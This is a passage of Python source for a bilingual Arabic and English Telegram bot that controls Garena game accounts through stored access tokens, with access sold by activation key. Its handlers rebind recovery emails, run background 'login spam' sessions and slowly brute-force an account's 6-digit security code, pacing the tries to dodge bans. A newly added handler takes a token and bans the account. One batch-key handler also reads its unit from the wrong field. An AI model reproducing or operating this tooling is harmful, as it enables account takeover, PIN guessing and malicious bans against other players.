        return

    if state == "awaiting_rebind_otp":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        new_email = context.user_data.get("rebind_new_email")
        identity_token = context.user_data.get("rebind_identity_token")
        
        success, msg, verifier_token = await garena.verify_otp(new_email, acc_data["ACCESS_TOKEN"], text)
        if not success or not verifier_token:
            context.user_data["state"] = None
            msg_resp = garena.format_api_text(msg, "التحقق من رمز OTP", "Verify OTP", lang)
            await update.message.reply_html(f"❌ {msg_resp}", reply_markup=make_user_menu(lang, is_admin))
            return
            
        context.user_data["state"] = None
        ok, resp_msg = await garena.create_rebind_request(acc_data["ACCESS_TOKEN"], identity_token, new_email, verifier_token)
        msg_resp = garena.format_api_text(resp_msg, "طلب تغيير البريد النهائي", "Create Rebind Request", lang)
        await update.message.reply_html(msg_resp, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_bind_email_input":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        if not acc_data:
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return
        
        email = text
        if "@" not in email:
            err_email_lbl = "❌ صيغة بريد إلكتروني غير صحيحة!" if lang == LANG_AR else "❌ Invalid email format!"
            await update.message.reply_html(err_email_lbl)
            return
        
        context.user_data["bind_email_address"] = email
        context.user_data["state"] = "awaiting_bind_otp"
        success, msg = await garena.send_otp(email, acc_data["ACCESS_TOKEN"])
        
        msg_resp = garena.format_api_text(msg, "إرسال كود الـ OTP", "Sending OTP Code", lang)
        prompt_lbl = "يرجى كتابة رمز التحقق (OTP) المرسل لبريدك الإلكتروني الآن:" if lang == LANG_AR else "Please send the verification OTP sent to your email now:"
        await update.message.reply_html(f"📥 <b>{msg_resp}</b>\n\n{prompt_lbl}")
        return

    if state == "awaiting_bind_otp":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        email = context.user_data.get("bind_email_address")
        
        success, msg, verifier = await garena.verify_otp(email, acc_data["ACCESS_TOKEN"], text)
        if not success or not verifier:
            msg_resp = garena.format_api_text(msg, "التحقق من الكود", "Verify Code", lang)
            await update.message.reply_html(f"❌ {msg_resp}")
            context.user_data["state"] = None
            return
            
        context.user_data["bind_verifier_token"] = verifier
        context.user_data["state"] = "awaiting_bind_sec_code"
        prompt_lbl = "🔑 تم التحقق بنجاح! أدخل كود الحماية المكون من 6 أرقام لتأكيد عملية الربط:" if lang == LANG_AR else "🔑 Verified! Send the 6-digit security code to confirm binding:"
        await update.message.reply_html(prompt_lbl)
        return

    if state == "awaiting_bind_sec_code":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        email = context.user_data.get("bind_email_address")
        verifier = context.user_data.get("bind_verifier_token")
        
        sec_code = text
        if len(sec_code) != 6 or not sec_code.isdigit():
            err_sec_lbl = "❌ كود الأمان يجب أن يتكون من 6 أرقام رقمية فقط!" if lang == LANG_AR else "❌ Security code must be exactly 6 numeric digits!"
            await update.message.reply_html(err_sec_lbl)
            return
            
        context.user_data["state"] = None
        success, msg = await garena.create_bind_request(email, acc_data["ACCESS_TOKEN"], verifier, sec_code)
        
        msg_resp = garena.format_api_text(msg, "طلب الربط النهائي", "Final Bind Request", lang)
        await update.message.reply_html(msg_resp, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_long_bio_text":
        context.user_data["state"] = None
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        loading_lbl = "⏳ جاري تحديث التوقيع..." if lang == LANG_AR else "⏳ Updating profile bio..."
        loading_msg = await update.message.reply_html(loading_lbl)
        success, msg = await garena.set_long_bio(text, acc_data["ACCESS_TOKEN"])
        
        btn = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم", callback_data=f"ctrl_acc_{target_account_id}", style="primary")]])
        if success:
            success_lbl = get_txt("long_bio_success", lang).format(text=text)
            await loading_msg.edit_text(success_lbl, parse_mode="HTML", reply_markup=btn)
        else:
            fail_lbl = "فشلت عملية تحديث التوقيع" if lang == LANG_AR else "Failed to update profile bio"
            await loading_msg.edit_text(f"❌ <b>{fail_lbl}</b>:\n{msg}", parse_mode="HTML", reply_markup=btn)
        return

    if state == "adm_awaiting_key_duration":
        try:
            parts = text.split()
            val, unit = int(parts[0]), parts[1].lower()
            if unit in ["hour", "hours", "hr", "h"]: unit = "hours"
            elif unit in ["day", "days", "d"]: unit = "days"
            else: raise ValueError
            context.user_data["adm_val"] = val
            context.user_data["adm_unit"] = unit
            context.user_data["state"] = "adm_awaiting_key_devices"
            prompt_lbl = f"⏰ المدة المحددة: <b>{val} {unit}</b>\n\nأدخل الآن الحد الأقصى للأجهزة (افتراضي: {MAX_DEVICES_DEFAULT}):" if lang == LANG_AR else f"⏰ Duration: <b>{val} {unit}</b>\n\nEnter max allowed devices (default: {MAX_DEVICES_DEFAULT}):"
            await update.message.reply_html(prompt_lbl)
        except:
            err_dur = "❌ تنسيق خاطئ! أرسل مثل: <code>24 hours</code> أو <code>7 days</code>" if lang == LANG_AR else "❌ Wrong format! Send like: <code>24 hours</code> or <code>7 days</code>"
            await update.message.reply_html(err_dur)
        return

    if state == "adm_awaiting_key_devices":
        try:
            max_dev = int(text) if text.strip() else MAX_DEVICES_DEFAULT
            val = context.user_data.get("adm_val")
            unit = context.user_data.get("adm_unit")
            key_data = KeyManager.create(val, unit, max_dev, user_id)
            KeyManager.save(key_data)
            context.user_data["state"] = None
            
            success_lbl = (
                f"✅ <b>تم توليد المفتاح بنجاح!</b>\n\n"
                f"🔑 <code>{key_data['key']}</code>\n"
                f"⏰ المدة: <b>{val} {unit}</b>\n"
                f"👥 الأجهزة: <b>{max_dev}</b>"
            ) if lang == LANG_AR else (
                f"✅ <b>Key Generated Successfully!</b>\n\n"
                f"🔑 <code>{key_data['key']}</code>\n"
                f"⏰ Lifetime: <b>{val} {unit}</b>\n"
                f"👥 Max Devices: <b>{max_dev}</b>"
            )
            await update.message.reply_html(success_lbl, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        except Exception as e:
            await update.message.reply_html(f"❌ Error: {e}")
        return

    if state == "adm_awaiting_batch_count":
        try:
            count = int(text)
            if count <= 0: raise ValueError
            context.user_data["adm_batch_count"] = count
            context.user_data["state"] = "adm_awaiting_batch_duration"
            prompt = f"🔢 العدد المطلوب: <b>{count} مفتاح</b>\n\nأدخل الآن مدة هذه الدفعة (مثال: <code>24 hours</code> أو <code>30 days</code>):" if lang == LANG_AR else f"🔢 Requested Count: <b>{count} keys</b>\n\nEnter the batch lifetime duration (e.g. <code>24 hours</code> or <code>30 days</code>):"
            await update.message.reply_html(prompt)
        except:
            await update.message.reply_html("❌ يرجى إدخال عدد صحيح أكبر من الصفر!")
        return

    if state == "adm_awaiting_batch_duration":
        try:
            parts = text.split()
            val, unit = int(parts[0]), parts[1].lower()
            if unit in ["hour", "hours", "hr", "h"]: unit = "hours"
            elif unit in ["day", "days", "d"]: unit = "days"
            else: raise ValueError
            context.user_data["adm_batch_val"] = val
            context.user_data["adm_batch_unit"] = unit
            context.user_data["state"] = "adm_awaiting_batch_devices"
            prompt = f"⏰ المدة المحددة للدفعة: <b>{val} {unit}</b>\n\nأدخل الآن الحد الأقصى للأجهزة للمفاتيح (افتراضي: {MAX_DEVICES_DEFAULT}):" if lang == LANG_AR else f"⏰ Selected Duration: <b>{val} {unit}</b>\n\nEnter max allowed devices for these keys (default: {MAX_DEVICES_DEFAULT}):"
            await update.message.reply_html(prompt)
        except:
            await update.message.reply_html("❌ تنسيق خاطئ! أرسل مثل: <code>24 hours</code> أو <code>7 days</code>")
        return

    if state == "adm_awaiting_batch_devices":
        try:
            max_dev = int(text) if text.strip() else MAX_DEVICES_DEFAULT
            count = context.user_data.get("adm_batch_count")
            val = context.user_data.get("adm_batch_val")
            unit = context.user_data.get("adm_batch_val")
            
            generated_keys = []
            for _ in range(count):
                key_data = KeyManager.create(val, unit, max_dev, user_id)
                key_data["key"] = key_data["key"]
                KeyManager.save(key_data)
                generated_keys.append(key_data["key"])
            
            context.user_data["state"] = None
            keys_list = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            
            success_msg = (
                f"📦 <b>تم توليد دفعة المفاتيح بنجاح!</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"🔢 عدد المفاتيح: <b>{count}</b>\n"
                f"⏰ الصلاحية: <b>{val} {unit}</b>\n"
                f"👥 الأجهزة: <b>{max_dev}</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"<b>قائمة المفاتيح المولدة:</b>\n{keys_list}"
            ) if lang == LANG_AR else (
                f"📦 <b>Batch Keys Generated Successfully!</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"🔢 Total Keys: <b>{count}</b>\n"
                f"⏰ Duration: <b>{val} {unit}</b>\n"
                f"👥 Devices: <b>{max_dev}</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"<b>Keys List:</b>\n{keys_list}"
            )
            await update.message.reply_html(success_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        except Exception as e:
            await update.message.reply_html(f"❌ خطأ: {e}")
        return

    if state == "adm_awaiting_disable_key_code":
        context.user_data["state"] = None
        if KeyManager.disable(text):
            success_msg = f"✅ تم تعطيل وإيقاف المفتاح <code>{text}</code> بنجاح من قاعدة البيانات." if lang == LANG_AR else f"✅ Key <code>{text}</code> has been disabled successfully."
            await update.message.reply_html(success_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        else:
            fail_msg = "❌ لم نجد هذا المفتاح في قاعدة البيانات!" if lang == LANG_AR else "❌ Key not found in database!"
            await update.message.reply_html(fail_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        return

    if state == "adm_awaiting_kick_id":
        try:
            target_id = int(text)
            context.user_data["state"] = None
            if KeyManager.remove_user_from_all_keys(target_id):
                await update.message.reply_html(get_txt("kick_success", lang).format(target_id=target_id))
            else:
                err_kick = "❌ لم نجد هذا العضو مرتبطاً بأي مفتاح!" if lang == LANG_AR else "❌ This user id has no active registration!"
                await update.message.reply_html(err_kick)
        except:
            await update.message.reply_html("❌ Enter valid User ID!")
        return

    if state == "adm_awaiting_admin_id" and user_id == OWNER_ID:
        try:
            target_id = int(text)
            context.user_data["state"] = None
            if DataManager.promote_to_admin(target_id):
                await update.message.reply_html(get_txt("admin_added_success", lang).format(target_id=target_id))
            else:
                await update.message.reply_html("❌ Fail to find target user.")
        except:
            await update.message.reply_html("❌ Enter valid User ID!")
        return

    if state == "adm_awaiting_broadcast_text":
        context.user_data["state"] = None
        users = DataManager.get_users()
        sent = 0
        for uid in users:
            try:
                await context.bot.send_message(
                    chat_id=int(uid),
                    text=f"📢 <b>Broadcast Announcement:</b>\n\n{text}",
                    parse_mode="HTML"
                )
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await update.message.reply_html(get_txt("broadcast_success", lang).format(sent=sent))
        return

    # ============================================================
    # حالة حظر الحساب (المضافة حديثاً)
    # ============================================================
    if state == "awaiting_ban_token":
        context.user_data["state"] = None
        token = text.strip()
        if not token:
            await update.message.reply_html("❌ التوكن لا يمكن أن يكون فارغاً!")
            return
        
        loading_msg = await update.message.reply_html(get_txt("ban_loading", lang))
        
        try:
            result = await ban_manager.perform_ban(token)
            if result.get("success"):
                msg = get_txt("ban_success", lang).format(
                    nickname=result.get('nickname', 'Unknown'),
                    account_id=result.get('account_id', 'Unknown'),
                    region=result.get('region', 'Unknown'),
                    ban_type=result.get('ban_type', 'Unknown'),
                    ban_duration=result.get('ban_duration', 'Unknown'),
                    saved_file=result.get('saved_file', 'غير محفوظ')
                )
                if result.get('save_status'):
                    msg += f"\n✅ تم حفظ البيانات في ملف `{result.get('saved_file')}`"
                else:
                    msg += f"\n⚠️ فشل حفظ الملف: {result.get('saved_file', '')}"
                await loading_msg.edit_text(msg, parse_mode="HTML", reply_markup=make_user_menu(lang, is_admin))
            else:
                error = result.get('error', 'خطأ غير معروف')
                await loading_msg.edit_text(get_txt("ban_failed", lang).format(error=error), parse_mode="HTML", reply_markup=make_user_menu(lang, is_admin))
        except Exception as e:
            await loading_msg.edit_text(f"❌ حدث خطأ أثناء التنفيذ: {str(e)}", parse_mode="HTML", reply_markup=make_user_menu(lang, is_admin))
        return

    await update.message.reply_html("⚠️ Command unrecognized.")

# ============================================================
# SMART INTERACTIVE CALLBACK HANDLERS
# ============================================================
async def handle_callback_queries(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    
    try:
        await query.answer()
    except Exception:
        pass
        
    user_id = update.effective_user.id
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)
    data = query.data

    if data == "btn_goto_home":
        await smart_edit(query, get_txt("welcome_back", lang), make_user_menu(lang, is_admin))
        return

    if data == "btn_change_lang":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar", style="primary"),
             InlineKeyboardButton("🇬🇧 English", callback_data="lang_en", style="primary")]
        ])
        await smart_edit(query, get_txt("choose_lang", lang), keyboard)
        return

    if data.startswith("lang_"):
        new_lang = data.split("_")[1]
        DataManager.set_user_lang(user_id, new_lang)
        await smart_edit(query, get_txt("lang_saved", new_lang), make_user_menu(new_lang, is_admin))
        return

    if data == "btn_contact":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home", style="primary")]])
        await smart_edit(query, get_txt("contact_us_text", lang), keyboard)
        return

    if data == "btn_help":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home", style="primary")]])
        await smart_edit(query, get_txt("help_text", lang), keyboard)
        return

    if data.startswith("op_start_login_"):
        aid = data.split("_")[3]
        u_info = DataManager.get_users().get(str(user_id), {})
        acc_data = u_info.get("accounts", {}).get(aid)
        if not acc_data:
            try:
                await query.answer("❌ لم يتم العثور على الحساب!", show_alert=True)
            except:
                pass
            return
            
        eat_token = acc_data.get("EAT") or acc_data.get("ACCESS_TOKEN")
        error, token_data = await garena.eat_to_token(eat_token)
        
        if error:
            access_token = acc_data.get("ACCESS_TOKEN")
        else:
            access_token = token_data.get("access_token")
            DataManager.save_garena_account(
                user_id=user_id,
                account_id=acc_data["ID"],
                nickname=token_data["nickname"],
                region=token_data["region"],
                access_token=access_token,
                eat_token=eat_token
            )
            
        success, result = await spam_manager.start_login_session(access_token, account_id=aid)
        if success:
            alert_msg = f"🚀 [R32] تم تفعيل سبام Login بنجاح لحساب {acc_data['NAME']}! الجلسات تدور الآن بالخلفية بجودة واستقرار."
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
        else:
            alert_msg = f"❌ فشل تشغيل سبام جارينا: {result}"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
            
        await show_account_control_view(query, user_id, aid, context)
        return

    if data.startswith("op_stop_login_"):
        aid = data.split("_")[3]
        success, msg = await spam_manager.stop_login_session(aid)
        if success:
            alert_msg = "⏹️ تم إيقاف جلسة السبام بنجاح لهذا الحساب!"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
        else:
            alert_msg = "⚠️ لا توجد جلسة نشطة لإيقافها لهذا الحساب!"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
            
        await show_account_control_view(query, user_id, aid, context)
        return

    if data.startswith("op_start_guess_"):
        aid = data.split("_")[3]
        u_info = DataManager.get_users().get(str(user_id), {})
        acc_data = u_info.get("accounts", {}).get(aid)
        if not acc_data:
            try:
                await query.answer("❌ لم يتم العثور على الحساب!", show_alert=True)
            except:
                pass
            return

        email, _, _, _ = await garena.get_bind_info(acc_data["ACCESS_TOKEN"])
        if not email:
            try:
                await query.answer("❌ لا يمكن تشغيل التخمين للحساب لعدم وجود إيميل مربوط حالياً به!", show_alert=True)
            except:
                pass
            return

        users = DataManager.get_users()
        users[str(user_id)]["accounts"][aid]["guessing_active"] = True
        users[str(user_id)]["accounts"][aid].setdefault("pin_index", 0)
        users[str(user_id)]["accounts"][aid].setdefault("guesses_today_count", 0)
        users[str(user_id)]["accounts"][aid].setdefault("last_guess_date", "")
        DataManager.save_users(users)

        asyncio.create_task(run_guessing_for_account(context.bot, str(user_id), aid))

        alert_msg = f"🧠 تم بدء التخمين الذكي لحساب {acc_data['NAME']} بنجاح! سيتم تجربة 10 رموز يومياً بفواصل آمنة في الخلفية."
        try:
            await query.answer(alert_msg, show_alert=True)
        except:
            pass
        await show_account_control_view(query, user_id, aid, context)
        return

    if data.startswith("op_stop_guess_"):
        aid = data.split("_")[3]
        users = DataManager.get_users()
        if str(user_id) in users and aid in users[str(user_id)]["accounts"]:
            users[str(user_id)]["accounts"][aid]["guessing_active"] = False
            DataManager.save_users(users)

        alert_msg = "⏹️ تم إيقاف التخمين الذكي للحساب بنجاح."
        try:
            await query.answer(alert_msg, show_alert=True)
        except:
            pass
        await show_account_control_view(query, user_id, aid, context)
        return

    if data == "op_daily_limit_alert":
        alert_msg = "⏳ لقد تم استهلاك الحد اليومي المسموح به (10 محاولات) لحماية هذا الحساب من البان. انتظر 24 ساعة ليعود العمل تلقائياً."
        try:
            await query.answer(alert_msg, show_alert=True)
        except:
            pass
        return

    if data == "op_unbind_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        email, _, _, _ = await garena.get_bind_info(acc["ACCESS_TOKEN"])
        if not email:
            try:
                await query.answer("❌ الحساب غير مرتبط بأي بريد إلكتروني ليفك ربطه!", show_alert=True)
            except:
                pass
            return
        context.user_data["state"] = "awaiting_unbind_sec_code"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية", callback_data=f"ctrl_acc_{aid}", style="danger")]])
        await smart_edit(query, "🔓 <b>فك ربط البريد الإلكتروني:</b>\n\nيرجى إرسال كود الحماية المكون من 6 أرقام لتأكيد هويتك وبدء عملية فك الربط:", keyboard)
        return

    if data == "op_change_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        email, _, _, _ = await garena.get_bind_info(acc["ACCESS_TOKEN"])
        if not email:
            try:
                await query.answer("❌ الحساب ليس لديه بريد مرتبط لتغييره! استخدم ربط بريد استرداد بدلاً من ذلك.", show_alert=True)
            except:
                pass
            return
        context.user_data["state"] = "awaiting_rebind_sec_code"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية", callback_data=f"ctrl_acc_{aid}", style="danger")]])
        await smart_edit(query, "🔄 <b>تغيير البريد الإلكتروني:</b>\n\nيرجى إرسال كود الحماية المكون من 6 أرقام أولاً لتأكيد هويتك وبدء عملية التغيير:", keyboard)
        return

    if data == "op_check_platforms":
        try:
            await query.answer("⚠️ هذه الميزة غير متوفرة حالياً في هذا الإصدار!", show_alert=True)
        except:
            pass
        return

    if data == "btn_add_acc":
        context.user_data["state"] = "awaiting_eat_input"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data="btn_goto_home", style="danger")]])
        await smart_edit(query, get_txt("enter_eat", lang), keyboard)
        return

    # ============================================================
    # زر حظر الحساب (المضافة حديثاً)
    # ============================================================
    if data == "btn_ban_acc":
        if not check_user_key(user_id):
            try:
                await query.answer("⚠️ يرجى تفعيل اشتراكك أولاً!", show_alert=True)
            except:
                pass
            return
        context.user_data["state"] = "awaiting_ban_token"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_goto_home", style="danger")]])
        await smart_edit(query, get_txt("ban_prompt", lang), keyboard)
        return

    if data == "btn_my_accs":
        u_info = DataManager.get_users().get(str(user_id), {})
        accounts = u_info.get("accounts", {})
        if not accounts:
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home", style="primary")]])
            await smart_edit(query, get_txt("no_saved_accs", lang), keyboard)
            return
        
        loading_lbl = "⏳ جاري فحص الحسابات..." if lang == LANG_AR else "⏳ Checking Garena sessions..."
        await smart_edit(query, loading_lbl, InlineKeyboardMarkup([]))
        
        tasks = [garena.get_player_info(acc["ACCESS_TOKEN"]) for acc in accounts.values()]
        results = await asyncio.gather(*tasks)
        
        buttons = []
        for (aid, acc), (_, _, _, active) in zip(accounts.items(), results):
            status_emoji = "🟢 شغال" if active else "🔴 محروق"
            style = "success" if active else "danger"
            buttons.append([InlineKeyboardButton(f"👤 {acc['NAME']} ({status_emoji})", callback_data=f"view_acc_{acc['ID']}", style=style)])
            
        buttons.append([InlineKeyboardButton("↩️ العودة للقائمة الرئيسية" if lang == LANG_AR else "↩️ Back to Menu", callback_data="btn_goto_home", style="primary")])
        keyboard = InlineKeyboardMarkup(buttons)
        await smart_edit(query, get_txt("my_saved_accs_title", lang), keyboard)
        return

    if data == "btn_ctrl_accs":
        u_info = DataManager.get_users().get(str(user_id), {})
        accounts = u_info.get("accounts", {})
        if not accounts:
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home", style="primary")]])
            await smart_edit(query, get_txt("no_saved_accs", lang), keyboard)
            return
            
        buttons = [[InlineKeyboardButton(f"⚙️ {acc['NAME']}", callback_data=f"ctrl_acc_{aid}", style="primary")] for aid, acc in accounts.items()]
        buttons.append([InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home", style="primary")])
        await smart_edit(query, get_txt("choose_ctrl_acc", lang), InlineKeyboardMarkup(buttons))
        return

    if data.startswith("ctrl_acc_") or data.startswith("view_acc_"):
        aid = data.split("_")[2]
        context.user_data["ctrl_account_id"] = aid
        await show_account_control_view(query, user_id, aid, context)
        return

    if data == "op_check_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        email, pending, countdown, _ = await garena.get_bind_info(acc["ACCESS_TOKEN"])
        
        lbl_current = get_txt("current_email", lang)
        lbl_pending = get_txt("pending_email", lang)
        lbl_remaining = get_txt("remaining_time", lang)
        header_lbl = "معلومات تأمين حساب:" if lang == LANG_AR else "Account Security Details for:"
        
        msg = (
            f"🔍 <b>{header_lbl} {acc['NAME']}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"{lbl_current} <code>{email or 'None'}</code>\n"
            f"{lbl_pending} <code>{pending or 'None'}</code>\n"
            f"{lbl_remaining} <b>{convert_seconds(countdown, lang) if pending else 'None'}</b>"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم" if lang == LANG_AR else "↩️ Back", callback_data=f"ctrl_acc_{aid}", style="primary")]])
        await smart_edit(query, msg, keyboard)
        return

    if data == "op_add_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        context.user_data["state"] = "awaiting_bind_email_input"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}", style="danger")]])
        await smart_edit(query, get_txt("enter_new_email", lang), keyboard)
        return

    if data == "op_cancel_pending":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        success, msg = await garena.cancel_bind_request(acc["ACCESS_TOKEN"])
        
        msg_resp = garena.format_api_text(msg, "طلب إلغاء الربط المعلق", "Cancel Pending Bind Request", lang)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم" if lang == LANG_AR else "↩️ Back", callback_data=f"ctrl_acc_{aid}", style="primary")]])
        await smart_edit(query, msg_resp, keyboard)
        return

    if data == "op_set_bio":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        context.user_data["state"] = "awaiting_long_bio_text"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}", style="danger")]])
        await smart_edit(query, get_txt("enter_long_bio", lang), keyboard)
        return

    if data == "op_revoke_token":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        error, rdata = await garena.do_revoke(acc["ACCESS_TOKEN"])
        if error:
            err_lbl = "❌ فشل تسجيل الخروج:" if lang == LANG_AR else "❌ Failed to revoke token:"
            await smart_edit(query, f"{err_lbl} {error}", InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data=f"ctrl_acc_{aid}", style="primary")]]))
            return
        
        DataManager.delete_garena_account(user_id, aid)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع للقائمة الرئيسية" if lang == LANG_AR else "↩️ Back to Menu", callback_data="btn_goto_home", style="primary")]])
        success_lbl = "🔴 <b>تم إلغاء صلاحية التوكن وتسجيل الخروج بنجاح!</b> تم إزالة الحساب المحروق من لوحة تحكمك." if lang == LANG_AR else "🔴 <b>Token successfully revoked and logged out!</b> Account has been deleted."
        await smart_edit(query, success_lbl, keyboard)
        return

    if data.startswith("op_delete_acc_"):
        aid = data.split("_")[3]
        DataManager.delete_garena_account(user_id, aid)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع للقائمة الرئيسية" if lang == LANG_AR else "↩️ Back to Menu", callback_data="btn_goto_home", style="primary")]])
        await smart_edit(query, get_txt("deleted_success", lang), keyboard)
        return

    if data == "btn_admin_panel" and is_admin:
        await smart_edit(query, get_txt("admin_welcome", lang), make_admin_menu(lang, user_id == OWNER_ID))
        return

    if data == "adm_goto_user" and is_admin:
        await smart_edit(query, get_txt("welcome_back", lang), make_user_menu(lang, is_admin))
        return

    if data == "adm_gen_key" and is_admin:
        context.user_data["state"] = "adm_awaiting_key_duration"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel", style="danger")]])
        prompt_lbl = "⏱️ <b>توليد مفتاح تفعيل جديد:</b>\n\nأرسل المدة المطلوبة الآن (مثال: <code>24 hours</code> أو <code>30 days</code>):" if lang == LANG_AR else "⏱️ <b>Generate new activation key:</b>\n\nSend desired duration (e.g. <code>24 hours</code> or <code>30 days</code>):"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_gen_batch" and is_admin:
        context.user_data["state"] = "adm_awaiting_batch_count"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel", style="danger")]])
        prompt = "📦 <b>توليد دفعة مفاتيح:</b>\n\nأدخل عدد المفاتيح التي ترغب في توليدها (مثال: 10):" if lang == LANG_AR else "📦 <b>Batch Keys Generation:</b>\n\nEnter the number of keys to generate (e.g. 10):"
        await smart_edit(query, prompt, keyboard)
        return

    if data == "adm_disable_key" and is_admin:
        context.user_data["state"] = "adm_awaiting_disable_key_code"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel", style="danger")]])
        prompt = "🔴 <b>إيقاف وتعطيل مفتاح:</b>\n\nأرسل كود مفتاح التفعيل الذي ترغب في تعطيله فوراً من قاعدة البيانات:" if lang == LANG_AR else "🔴 <b>Disable Activation Key:</b>\n\nSend the activation key code you want to deactivate immediately:"
        await smart_edit(query, prompt, keyboard)
        return

